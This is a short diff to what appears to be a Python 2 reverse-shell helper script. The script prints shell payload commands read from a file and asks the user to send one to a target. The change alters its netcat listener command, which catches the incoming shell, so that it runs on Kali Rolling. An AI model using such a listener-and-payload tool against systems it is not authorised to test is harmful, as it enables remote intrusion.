@@ -17,4 +17,7 @@ for shell in open(shells):
 	print cmd
 
 raw_input('Select your payload, press any key to start the nc listener and send it to the target...')
-os.system('nc -vv -l %s %s' % (ipaddr,port))
+
+#os.system('nc -vv -l %s %s' % (ipaddr, port))
+os.system('nc -vvln -s %s -p %s' % (ipaddr, port)) # changed to work with Kali Rolling
+
